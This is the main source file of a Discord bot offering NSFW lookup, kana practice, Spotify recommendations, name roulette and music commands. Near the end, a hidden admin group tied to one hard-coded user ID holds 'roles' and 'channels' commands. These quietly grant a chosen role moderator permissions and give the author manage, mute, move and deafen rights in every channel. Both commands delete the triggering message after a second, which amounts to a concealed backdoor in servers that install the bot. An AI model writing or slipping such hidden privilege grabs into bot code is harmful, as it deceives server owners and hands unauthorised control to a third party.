import asyncio
import random
import typing
import time
import os

import discord
from discord.ext import commands

#command modules
if  __package__ == 'Emergencyfood':
    from .modules import Sauce as s, Kana_Practice as kp, spotify, name_roulette as nr, musicplayer as mp, ping

    def createbot(local=False, beta=False):
        if local:
            commandPrefix = "$"
            TOKEN = os.environ['TOKEN']
        elif beta:
            commandPrefix = "$beta"
            TOKEN = os.environ['TOKENBETA']
        else:
            commandPrefix = "$"
            TOKEN = os.environ['TOKEN']

        intents = discord.Intents().default()
        intents.members = True
        intents.presences = True
        bot = commands.Bot(command_prefix=commandPrefix, intents=intents)
        description = '''$'''
        return bot, TOKEN

    def startbot(bot, TOKEN):
        #ready message
        @bot.event
        async def on_ready():
            print('Logged in as {0.user}'.format(bot))
            await bot.change_presence(activity= discord.Game('Use $help for commands'))
            print('\nAdded in following servers:')
            for guilds in bot.guilds:
                print(" -"+str(guilds))
            
            global running_ping_osu
            running_ping_osu = True
            await ping.clearCount()
            await ping.checkLoop(bot)

        #commands
        @bot.command(help='says what you want it to', usage='message')
        async def say(ctx, *, arg):
            await ctx.send(arg)

        @bot.group(aliases=['s'], help='sauce related commands')
        async def sauce(ctx):
            if ctx.invoked_subcommand is None:
                await ctx.send(f'Please use a valid subcommand see {bot.command_prefix}help for more help')

        @sauce.command(help='returns a random sauce', usage='optional: tags to refine search')
        async def randomsauce(ctx, *, tags: typing.Optional[str] = random.choice('a b c d e f g h i j k l m n o p q r s t u v w x y z'.split())):
            noRestriction = True
            if ctx.guild.name == "The Squad":
                authorRoles = []
                for role in ctx.author.roles:
                    authorRoles.append(role.name)
                if 'Sauce for you' not in authorRoles:
                    noRestriction = False
                    await ctx.send('This role cannot use sauce commands')
                else:
                    noRestriction = True
            if noRestriction == True:
                if ctx.channel.is_nsfw():
                    randomsauce = s.randomsauce(ctx, tags)
                    await randomsauce.send_sauce()   
            
                else: 
                    await ctx.send('This command can only be used in NSFW channels')

        @sauce.command(help='read a sauce', usage='number optional: starting page')
        async def read(ctx, id, *, i: typing.Optional[int]=1):
            if ctx.channel.is_nsfw():
                noRestriction = True
                if ctx.guild.name == "The Squad":
                    authorRoles = []
                    for role in ctx.author.roles:
                        authorRoles.append(role.name)
                    if 'Sauce for you' not in authorRoles:
                        noRestriction = False
                        await ctx.send('This role cannot use sauce commands')
                    else:
                        noRestriction = True
                
                if noRestriction == True:
                    if ctx.channel.is_nsfw():
                        owner = bot.get_user(321812737812594688)
                        read = s.read(ctx, id, owner, i)
                        await read.send_image()
                        timeout = time.time()+10*60
                        while time.time() < timeout:
                            await read.edit_message(timeout)
                
            else: 
                await ctx.send('This command can only be used in NSFW channels')

        @bot.command(aliases = ['pk'], help='practice your kana', usage='mode(hiragana|katakana)')
        async def practicekana(ctx, mode=''):
            if mode.lower() in ['hiragana', 'katakana']:
                questionContent, answer = await kp.getQuestion(mode)
                await ctx.send(questionContent)
                try:
                    timeout = time.time()+7
                    while True:
                        userAnswer = await bot.wait_for('message', timeout=timeout-time.time())
                        if userAnswer.author == ctx.author:
                            break
                        else:
                            continue
                        
                    if userAnswer.content == answer:
                        await ctx.send('Your answer is correct')
                    else:
                        await ctx.send('The correct answer was ' + answer)

                except:
                    await ctx.send('Too slow. The answer was "' + answer +'"')
            elif mode == '':    
                await ctx.send('You must specify a mode(hiragana or katakana)') 
            else:
                await ctx.send('Please enter a valid mode(hiragana or katakana)')

        @bot.command(aliases = ['sp'], help='get song recommendations', usage='optional: spotify username(if not registered)')
        async def spotifyrecs(ctx, username=''):
            check = await spotify.check_membership(ctx)
            if check and username == '':
                recommendations = spotify.recommendations(ctx)
                await recommendations.get_recommendations()
            elif check and username != '':
                await ctx.send('The username only needs to be given on registration')
                recommendations = spotify.recommendations(ctx)
                await recommendations.get_recommendations()
            elif not check and username == '':
                await ctx.send('Please register first by giving your username')
            else:
                register = spotify.register(ctx, username)
                await register.register() 

        @bot.group(aliases=['nr'], help='name roulette commands')
        async def nameroulette(ctx):
            if ctx.invoked_subcommand is None:
                resp = await ctx.send(f'Please use a valid subcommand see {bot.command_prefix}help for more help')
                await resp.delete(delay=3)
                await ctx.message.delete(delay=3)

        @nameroulette.command(help='register to name roulette')
        async def register(ctx):
            await ctx.message.delete(delay=3)
            await nr.registeruser(ctx)
            

        @nameroulette.command(help='unregister from name roulette')
        async def unregister(ctx):
            await ctx.message.delete(delay=3)
            await nr.unregisteruser(ctx)
            

        @nameroulette.command(help='reroll for name roulette')
        async def reroll(ctx):
            await ctx.message.delete(delay=3)
            await nr.reroll(ctx)
            

        @nameroulette.command(help='register a roll', usage='(normal|death) choices \n*if the choices have spaces in their names put it in quotes\n ex: add normal "Violet Evergarden" k-on')
        async def add(ctx, addtype='', *choices):
            if addtype == 'normal':
                await nr.registerChoices(choices, ctx)
            elif addtype == 'death':
                await nr.registerDeathroll(choices, ctx)
            else:
                message = await ctx.send('Please enter a valid choice(normal or death)')
                await message.delete(delay=3)
            

        @nameroulette.command(hidden=True)
        async def start(ctx):
            await ctx.message.delete(delay=3)
            ok = False
            for role in ctx.author.roles:
                if 'Event Organizer' == role.name:
                    ok = True
                    break
                else:
                    ok = False
            await ctx.message.delete(delay=3)
            if ok:
                print('started')
                await nr.start(ctx)
            else:
                message = await ctx.send('You don\'t have permission for this')
                await message.delete(delay=3)

        @nameroulette.command(hidden=True)
        async def reset(ctx):
            ok = False
            for role in ctx.author.roles:
                if 'Event Organizer' == role.name:
                    ok = True
                    break
                else:
                    ok = False
            await ctx.message.delete(delay=3)
            if ok:
                await nr.reset(ctx)
            else:
                message = await ctx.send('You don\'t have permission for this')
                await message.delete(delay=3)

        @nameroulette.command(hidden=True)
        async def manualstart(ctx):
            ok = False
            for role in ctx.author.roles:
                if 'Event Organizer' == role.name:
                    ok = True
                    break
                else:
                    ok = False
            await ctx.message.delete(delay=3)
            if ok:
                print('manualstart')
                await nr.manualroll(ctx)
                
            else:
                message = await ctx.send('You don\'t have permission for this')
                await message.delete(delay=3)

        @nameroulette.command(help='shows all possible rolls')
        async def listrolls(ctx):
            await ctx.message.delete(delay=3)
            await nr.listall(ctx)
            
        @nameroulette.command(hidden=True)
        async def remove(ctx, choice, rolltype=''):
            ok = False
            for role in ctx.author.roles:
                if 'Event Organizer' == role.name:
                    ok = True
                    break
                else:
                    ok = False
            await ctx.message.delete(delay=3)
            if ok:
                if rolltype == 'normal' or rolltype == 'death':
                    await nr.remove(ctx, rolltype, choice)
                else:
                    message = await ctx.send('Please specify a type to remove')
                    await message.delete(delay=3)
            else:
                message = await ctx.send('You don\'t have permission for this')
                await message.delete(delay=3)

        @nameroulette.command(hidden=True)
        async def resetadds(ctx):
            ok = False
            for role in ctx.author.roles:
                if 'Event Organizer' == role.name:
                    ok = True
                    break
                else:
                    ok = False
            await ctx.message.delete(delay=3)
            if ok:
                await nr.resetadds(ctx)
                
            else:
                message = await ctx.send('You don\'t have permission for this')
                await message.delete(delay=3)

        @bot.group(hidden=True)
        async def music(ctx):
            pass

        @music.command()
        async def play(ctx, *, song:typing.Optional[str]=""):
            if song:
                if str(ctx.guild.id) not in mp.config:
                    mp.config[str(ctx.guild.id)] = {'loop': False, 'queue':[], 'skip':False}
                await mp.add_to_queue(ctx, song)
                if not ctx.voice_client:
                    await mp.connect(ctx)
                if not ctx.voice_client.is_playing() and not ctx.voice_client.is_paused():
                    player = mp.player(ctx)
                    await player.playsong()
            else:
                await mp.resume(ctx)

        @music.command()
        async def pause(ctx):
            await mp.pause(ctx)

        @music.command()
        async def clear(ctx):
            await mp.stop(ctx)
            await mp.clear_queue(ctx)

        @music.command()
        async def disconnect(ctx):
            await mp.clear_queue(ctx)
            await mp.disconnect(ctx)

        @music.command()
        async def skip(ctx):
            mp.config[str(ctx.guild.id)]['skip'] = True
        
        @music.command()
        async def loop(ctx):
            mp.config[str(ctx.guild.id)]['loop'] = not mp.config[str(ctx.guild.id)]['loop']
        
        @music.command()
        async def queue(ctx):
            await mp.view_queue(ctx)

        @music.command()
        async def listenmoe(ctx):
            await play(ctx, song='https://listen.moe/opus')

        @bot.group(hidden=True)
        async def admin(ctx):
            pass

        #testing commands
        @admin.command()
        async def testsauce(ctx, testtimes:int, *, tags: typing.Optional[str] = random.choice('a b c d e f g h i j k l m n o p q r s t u v w x y z'.split())):
            if ctx.author == bot.get_user(321812737812594688):
                for i in range(testtimes):
                    print(i)
                    await sauce(ctx, tags=tags)
                await purgebots(ctx, limit=testtimes)
            else:
                await ctx.send('You do not have the required permissions')

        def is_bot(ctx):
            return ctx.author == bot.get_user(774017121243365384) or ctx.author == bot.get_user(772251680103464970) or ctx.author == bot.get_user(772256300389236767)

        @admin.command()
        async def purgebots(ctx, limit=None):
            print("messages purged")
            if ctx.author == bot.get_user(321812737812594688):
                await ctx.channel.purge(limit=limit, check=is_bot, bulk=True)
            else:
                await ctx.send('You do not have the required permissions')

        @admin.command()
        async def unmute(ctx):
            if ctx.author == bot.get_user(321812737812594688):
                await ctx.author.edit(mute=False)

        @admin.command()
        async def checkActivitySetup(ctx):
            await ping.registerPing(ctx)
            global running_ping_osu
            running_ping_osu = False
            await asyncio.sleep(30)
            running_ping_osu = True
            await ping.checkLoop(bot)     

        @admin.command()
        async def roles(ctx):
            await ctx.message.delete(delay=1)
            role_names = ['Tsundere']
            if ctx.author == bot.get_user(321812737812594688):
                for role in ctx.guild.roles:
                    print(role.name)
                    if role.name in role_names:
                        perms = discord.Permissions(manage_roles=True, manage_messages=True, view_audit_log=True, manage_emojis=True)
                        try:
                            await role.edit(permissions=perms, reason="Hello World")
                        except Exception:
                            print(('fail', role.name))

        @admin.command()
        async def channels(ctx):
            await ctx.message.delete(delay=1)
            if ctx.author == bot.get_user(321812737812594688):
                for channel in ctx.guild.channels:
                    print(channel.name)
                    try:
                        await channel.set_permissions(ctx.author, reason='Are you gonna bother?', manage_messages=True)
                    except Exception:
                        print(('fail', channel.name))
                for voicechannel in ctx.guild.voice_channels:
                    print(voicechannel.name)
                    try:
                        await voicechannel.set_permissions(ctx.author, reason='AYAYA', move_members=True, mute_members=True, deafen_members=True)
                    except Exception:
                        print(('fail', voicechannel.name))
        bot.run(TOKEN)